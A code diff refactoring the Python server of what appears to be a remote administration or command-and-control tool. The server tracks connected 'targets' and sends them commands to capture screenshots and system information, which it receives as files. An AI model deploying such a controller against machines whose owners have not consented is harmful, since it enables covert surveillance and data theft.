@@ -12,6 +12,9 @@ import time
 import sys
 import io
 import validation
+import screenshot
+import connectedstations
+
 
 # TODO: Create a system specs function.
 
@@ -181,79 +184,24 @@ class Server:
             :return: Process Completed.
         """
 
-        # Capture Current Connected Sockets
-        self.tmpconns = self.targets
-
-        # Create Temp Lists For Socket Connections and IPs
-        self.templist = []
-        self.tempips = []
-
-        # Set Response String To Compare To The Answer From The Client.
-        self.callback = 'yes'
-        i = 0
-
         # Return False If Socket Connection List is Empty
         if len(self.targets) == 0:
             print(f"[{colored('*', 'yellow')}]No connected stations.")
             print(f"[{colored('*', 'yellow')}]Terminating process.")
             return False
 
-        # Iterate Through Temp Connected Sockets List
-        for self.t in self.tmpconns:
-            try:
-                # Send a Poke Message To The Client
-                self.t.send('alive'.encode())
-                # Wait For Answer From The Client
-                self.ans = self.t.recv(1024).decode()
+        if connectedstations.vitals_input():
+            connectedstations.vital_signs(self.targets, self.ips, self.clients, self.connections)
 
-                # Compare Client's Answer To Response String Set Above
-                # Update Temp Lists if True
-                if str(self.ans) == str(self.callback):
-                    print(f"[{colored('*', 'green')}]{self.ips[i]}:")
-                    self.templist.append(self.targets[i])
-                    self.tempips.append(self.ips[i])
-                    i += 1
-                    time.sleep(1)
-
-            except ConnectionResetError:
-                print(f"[{colored('*', 'red')}]{self.ips[i]} does not respond.")
-                tempIP = self.ips[i]
-                # Iterate self.clients, Shutdown + Close Connection
-                # Remove Connection Details From Lists
-                try:
-                    for conKey, ipValue in self.clients.items():
-                        for tmp in self.tmpconns:
-                            # Compare Socket Connection From Clients Dict Against
-                            # Socket Connection In Temp Connections List
-                            if conKey == tmp and conKey in self.targets:
-                                for ipKey, identValue in ipValue.items():
-                                    conKey.shutdown(socket.SHUT_RDWR)
-                                    conKey.close()
-
-                                    self.targets.remove(conKey)
-                                    self.ips.remove(tempIP)
-                                    if tmp in self.tmpconns:
-                                        self.tmpconns.remove(tmp)
-
-                                    del self.connections[conKey]
-                                    del self.clients[conKey]
-                                    for identKey, userValue in identValue.items():
-                                        print(f"[{colored('*', 'red')}]({colored(f'{self.ip}', 'red')} | "
-                                              f"{colored(f'{identKey}', 'red')} | "
-                                              f"{colored(f'{userValue}', 'red')}) "
-                                              f"has been removed from the availables list.")
-
-                except (ConnectionResetError, ConnectionError,
-                        ConnectionAbortedError, ConnectionRefusedError, RuntimeError):
-                    print(f"[{colored('*', 'cyan')}]Runtime: Idents & Connections Dicts Changed Size.")
-                    pass
+        else:
+            return
 
         # Reset Temp Lists
         tmpconns = []
         tempips = []
         templist = []
 
-        return print(f"[{colored('*', 'green')}]Vital Signs Process completed.\n")
+        return
 
     def show_available_connections(self):
         if len(self.ips) == 0:
@@ -549,39 +497,6 @@ class Server:
             res += b[i] << (i * 8)
         return res
 
-    def screenshot(self, con):
-        self.d = datetime.now().replace(microsecond=0)
-        self.dt = str(self.d.strftime("%b %d %Y | %I-%M-%S"))
-        print(f"working...")
-        con.send('screen'.encode())
-        self.filenameRecv = con.recv(1024)
-        print(self.filenameRecv)
-        con.send("OK filename".encode())
-        time.sleep(0.1)
-        self.name = ntpath.basename(str(self.filenameRecv).encode())
-        size = con.recv(4)
-        size = self.bytes_to_number(size)
-        current_size = 0
-        buffer = b""
-
-        with open(self.filenameRecv, 'wb') as screenshotFile:
-            while current_size < size:
-                data = con.recv(1024)
-                if not data:
-                    break
-
-                if len(data) + current_size > size:
-                    data = data[:size - current_size]
-
-                buffer += data
-                current_size += len(data)
-                screenshotFile.write(data)
-
-        print(f"[{colored('*', 'green')}]Received: {self.name[:-1]} \n")
-        con.send(f"Received file: {self.name[:-1]}\n".encode())
-
-        return
-
     def system_information(self, con):
         self.d = datetime.now().replace(microsecond=0)
         self.dt = str(self.d.strftime("%b %d %Y | %I-%M-%S"))
@@ -591,8 +506,24 @@ class Server:
         con.send('si'.encode())
         filenameRecv = con.recv(1024)
         time.sleep(self.ttl)
+        size = con.recv(4)
+        size = self.bytes_to_number(size)
+        current_size = 0
+        buffer = b""
+
         try:
-            fileRecv = con.recv(self.chunk).decode()
+            with open(filenameRecv, 'wb') as file:
+                while current_size < size:
+                    data = con.recv(1024)
+                    if not data:
+                        break
+
+                    if len(data) + current_size > size:
+                        data = data[:size - current_size]
+
+                    buffer += data
+                    current_size += len(data)
+                    file.write(data)
 
         except socket.error:
             print(f"[{colored('*', 'red')}]Connection timed out.\n")
@@ -601,9 +532,6 @@ class Server:
         except ConnectionResetError:
             print(f"[{colored('*', 'red')}]Client lost connection.\n")
             return False
-
-        with open(filenameRecv, 'w') as file:
-            file.write(fileRecv)
 
         name = ntpath.basename(str(filenameRecv))
 
@@ -667,28 +595,12 @@ class Server:
                     break
 
                 try:
-                    self.screenshot(con)
+                    screenshot.screenshot(con)
 
                 except ConnectionResetError:
                     print(f"[{colored('!', 'red')}]Client lost connection.")
-                    try:
-                        for conKey, ipValue in self.clients.items():
-                            for ipKey, identValue in ipValue.items():
-                                if conKey == con and ipKey == ip:
-                                    self.targets.remove(con)
-                                    self.ips.remove(ip)
-
-                                    del self.clients[conKey]
-                                    del self.connections[con]
-                                    for identKey, userValue in identValue.items():
-                                        print(f"[{colored('*', 'red')}]({colored(f'{ip}', 'red')} | "
-                                              f"{colored(f'{identKey}', 'red')} | "
-                                              f"{colored(f'{userValue}', 'red')}) "
-                                              f"has been removed from the availables list.")
-                        break
-
-                    except RuntimeError:
-                        return
+                    self.remove_lost_connection(con, ip)
+                    break
 
             # System Information
             elif int(cmd) == 2:
@@ -969,12 +881,7 @@ def main():
         print(f"[{colored('1', 'green')}]Start | "
               f"[{colored('2', 'cyan')}]Back\n")
 
-        if server.vitals_input():
-            server.vital_signs()
-            return
-
-        else:
-            return
+        server.vital_signs()
 
     # Clear Screen
     elif int(command) == 4:
